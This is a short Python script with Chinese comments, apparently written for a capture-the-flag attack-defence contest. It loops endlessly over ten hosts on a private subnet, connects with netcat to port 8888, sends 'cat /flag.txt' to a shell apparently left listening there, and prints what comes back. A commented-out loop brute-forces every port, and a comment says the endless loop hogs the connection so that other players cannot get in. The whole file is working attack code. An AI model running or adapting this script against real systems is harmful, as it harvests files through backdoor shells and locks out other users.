# -*- coding: utf-8 -*
#只允许在Linux环境中运行
import pexpect

while(1):     #可一直循环占坑，防止其他人连接
    for i in range(30,40):
        host='192.168.132.'+str(i)
        # for j in range(0,65535):      ##爆破端口
        #     j=str(j)
        #     a = pexpect.spawn("nc %s %s:"%(host,j))
        a = pexpect.spawn("nc %s 8888:"%host)
        a.setecho(False)
        a.sendline('cat /flag.txt')
        a.sendline('exit')
        flag=a.read()
        print(host+':'+flag)